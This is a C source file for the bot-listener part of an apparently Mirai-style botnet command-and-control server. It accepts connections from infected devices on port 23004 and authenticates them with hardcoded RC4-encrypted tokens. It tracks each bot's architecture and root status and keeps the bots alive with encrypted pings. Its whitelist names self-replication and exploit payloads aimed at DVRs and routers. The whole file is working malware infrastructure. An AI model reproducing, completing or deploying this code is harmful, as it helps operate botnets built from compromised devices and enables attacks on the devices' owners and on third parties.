#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/epoll.h>

#include "enc.h"
#include "arch.h"
#include "epoll.h"

#define WHITELIST_SIZE (sizeof(whitelist) / sizeof(whitelist[0]))

static const char *whitelist[] = {

    "bigbbos",
    "exploit",
    "dvrhik",
    "massload",
    "shoreline",
    "monke",
    "utt.echo",
    "fbnew.arm",
    "fbnew.mips",
    "fuck",
    "olt.mips",
    "xpl1",
    "xpl2",
    "xpl3",
    "xpl4",
    "xpl5",
    "xpl6",
    "xpl7",
    "xpl8",
    "xpl9",
    "xpl10",
    "xpl11",
    "xpl12",
    "lark_router",
    "kr_cert",
    "dvnr",
    "hikdvr",
    "cnr",
    "dvr",
    "selfrep",
    "selfrep.echo",
    "selfrep.ftpget",
    "selfrep.tftp",
    "selfrep.curl",
    "selfrep.wget",
    "test"
};

struct bot_t bot[MAX_BOTS];

int listen_fd, epoll_fd;

static int setup_fd(void) {

	int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);

    if (fd == -1) {
        printf("[setup_fd] socket() failed\n");
        return -1;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1) {
        printf("[setup_fd] setsockopt() failed\n");
    	return -1;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(23004),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
		printf("[setup_fd] bind() failed\n");
		return -1;
    }

    if (listen(fd, SOMAXCONN) == -1) {
    	printf("[setup_fd] listen() failed\n");
        return -1;
    }

    printf("[setup_fd] listen() on port: (%d)\n", ntohs(addr.sin_port));

    return fd;
}

static void epoll_control(int fd, uint32_t events, int op) {

    struct epoll_event event = {
        .data.fd = fd,
        .events = events
    };

    epoll_ctl(epoll_fd, op, fd, &event);
}

static void close_fd(int fd) {

    if (bot[fd].connected)
        update_arch(bot[fd].arch, FALSE);
    
    close(fd);
    epoll_control(fd, 0, EPOLL_CTL_DEL);
    memset(&bot[fd], 0, sizeof(struct bot_t));
}

static void *send_ping() {

    char ping_str[] = ">>";

    rc4(ping_str, 2);

    while (TRUE) {

        for (int i = 0; i < MAX_BOTS; i++) {
            if (!bot[i].connected)
                continue;
        
            if (++bot[i].pings > 4) {
                printf("[send_ping] maximum pings reached (%s:%d:%s:%d)\n", inet_ntoa((struct in_addr){bot[i].addr.sin_addr.s_addr}), ntohs(bot[i].addr.sin_port), bot[i].arch, bot[i].root);
                close_fd(i);
                continue;
            }

            send(i, ping_str, 2, MSG_NOSIGNAL);
        }

        sleep(30);
    }

    return NULL;
}

static void accept_connection(void) {

    struct sockaddr_in addr;
    socklen_t len = sizeof(struct sockaddr_in);

    while (TRUE) {
    	int fd = accept4(listen_fd, (struct sockaddr *)&addr, &len, SOCK_NONBLOCK);

        if (fd == -1)
        	break;

        bot[fd].addr = addr;

        epoll_control(fd, EPOLLIN | EPOLLET, EPOLL_CTL_ADD);
    }
}

static int find_c(char *buf, char c) {

    int len = strlen(buf);

    for (int i = len - 1; i >= 0; i--) {
        if (buf[i] == c)
            return i + 1;
    }

    return -1;
}

static int is_whitelisted(const char *arch) {
    for (size_t i = 0; i < WHITELIST_SIZE; i++) {
        if (!strcmp(arch, whitelist[i])) {
            return 1;
        }
    }
    return 0;
}

static void recv_bot(int fd) {
    int len;
    char rcvbuf[128] = {0};

    if ((len = recv(fd, rcvbuf, sizeof(rcvbuf), MSG_NOSIGNAL)) <= 0) {
        if (bot[fd].connected)
            printf("[recv_bot] recv() failed (%s:%d:%s:%d)\n", inet_ntoa((struct in_addr){bot[fd].addr.sin_addr.s_addr}), ntohs(bot[fd].addr.sin_port), bot[fd].arch, bot[fd].root);
        close_fd(fd);
        return;
    }
/*
    printf("[recv_bot] Raw bytes -> : \"");
    
    for (int i = 0; i < len; i++) {
    
        printf("\\x%02X", (unsigned char)rcvbuf[i]);
    }
    
    printf("\"\n");
    
    printf("[recv_bot] (non decrypted) received auth token: %.*s\n", 32, rcvbuf);
    
    printf("[recv_bot] len fetched: %d\n", len);
*/
    rc4(rcvbuf, len);

    if (bot[fd].connected) {
        if (!strncmp(rcvbuf, "<<", 2))
            bot[fd].pings = 0;
    } else {
//        printf("[recv_bot] received auth token: %.*s\n", 39, rcvbuf);

        if (!strncmp(rcvbuf, "azbd27sc1ycbgmz1dn2sf02c5tcow2lh", 32) || !strncmp(rcvbuf, "ec9CiEw-CAQke%2pWdeuz]7B_C;Zgvx0", 32)) {
            int pos = find_c(rcvbuf, ':');
            if (pos == -1)
                goto label;

            int arch_len = pos - 32 - 1;
            if (arch_len < 1 || arch_len > 32)
                goto label;

            int c_len = strlen(rcvbuf + pos);
            if (c_len != 1 || (rcvbuf[pos] != '0' && rcvbuf[pos] != '1'))
                goto label;

            char arch[33] = {0};
            strncpy(arch, rcvbuf + 32, arch_len);
            arch[arch_len] = '\0';

            if (!is_whitelisted(arch))
                goto label;

            bot[fd].connected = TRUE;
            bot[fd].root = rcvbuf[pos] == '1' ? TRUE : FALSE;
            strncpy(bot[fd].arch, arch, arch_len);
            bot[fd].arch[arch_len] = '\0';
            update_arch(bot[fd].arch, TRUE);

            printf("[recv_bot] recv() successful (%s:%d:%s:%d)\n", inet_ntoa((struct in_addr){bot[fd].addr.sin_addr.s_addr}), ntohs(bot[fd].addr.sin_port), bot[fd].arch, bot[fd].root);
        } else {
label:
            close_fd(fd);
        }
    }
}

static void *epoll_loop() {

    pthread_t thread;
    pthread_create(&thread, NULL, &send_ping, NULL);

    printf("[epoll_loop] setup send_ping() thread\n");

	int nfds;
    struct epoll_event *events = calloc(MAX_BOTS, sizeof(struct epoll_event));

    while (TRUE) {
        if ((nfds = epoll_wait(epoll_fd, events, MAX_BOTS, -1)) == -1) {
        	printf("[epoll_loop] epoll_wait() failed\n");
        	return NULL;
        }

        for (int i = 0; i < nfds; i++) {
            if (events[i].data.fd == listen_fd)
            	accept_connection();
            else
            	recv_bot(events[i].data.fd);
        }
    }
}

BOOL epoll_init(void) {

	if ((listen_fd = setup_fd()) == -1) {
		printf("[epoll_init] setup_fd() failed\n");
		return FALSE;
	}

	if ((epoll_fd = epoll_create1(0)) == -1) {
		printf("[epoll_init] epoll_create1() failed\n");
		return FALSE;
	}

	struct epoll_event event = {
        .data.fd = listen_fd,
        .events = EPOLLIN | EPOLLET
    };

    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event) == -1) {
    	printf("[epoll_init] epoll_ctl() failed\n");
    	return FALSE;
    }

    pthread_t thread;
    pthread_create(&thread, NULL, &epoll_loop, NULL);

    printf("[epoll_init] setup epoll_loop() thread\n");

    return TRUE;
}
